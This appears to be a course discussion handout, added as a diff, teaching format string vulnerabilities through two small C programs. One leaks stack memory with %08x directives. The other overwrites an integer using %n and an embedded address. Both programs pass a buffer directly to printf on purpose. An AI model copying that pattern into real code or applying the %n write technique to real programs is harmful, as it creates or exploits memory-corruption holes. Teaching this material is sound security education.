@@ -1,0 +1,32 @@
+Examples from Discussion 04-14!
+Hey ALl,
+
+    There were some requests for copy-pastable examples from discussion yesterday, so here we are! 
+ 
+To use, compile with "gcc -ggdb", copy into "/tmp", and run from there. Do not use the '-o <outputname>' argument.
+
+The first example shows us how we can adjust the printf argument stack pointer to get it pointing where we want. By using the '%08x' directives, we fool printf into moving its internal argument stack pointer higher and higher and higher. Eventually, we move the printf internal argument stack pointer to the start of 'buf', so '0x41414141' is printed out as the final '%08x' (should be surrounded by pipes). 
+#include <stdio.h>
+#include <string.h>
+int main(void) {
+ char buf[1000] = "AAAABBBB|%08x%08x%08x%08x%08x|%08x|\n";
+ printf(buf);
+ return 0;
+}
+
+In the next example, we do something a little more complicated. We know that we can get our printf argument pointer up to the start of buf. Instead of giving a value for us to read, we give printf a value to write with. We swap our '%08x' directive that printed 0x41414141 to the screen for a '%n' directive that will write a number to an address (namely, the number of characters printed so far by this format string). We find the address of an integer in our program (here, 'int a') using GDB (or really any other reliable method), and supply *that* as the argument to the %n directive. The end result? The integer 'a' holds the answer to life, the universe, and everything. 
+#include <stdio.h>
+#include <string.h>
+// Idea: write some characters into the integer a.
+int main(void) { 
+ // Setting up a as a location to write to.
+ int a = 0x00000000; printf("%d\n", a);
+ // &a is bffff77c, found in any useful way (GDB, etc.).
+ // Notice we use little endian notation! 
+ char buf[1000] = "\x7c\xf7\xff\xbf <-- %08x%08x%08x%08x|%n|\n"; 
+ // Trying to change &a by printing this format string. 
+ printf(buf);
+ // Check if a is changed. 
+ printf("%d\n", a);
+ return 0;
+}
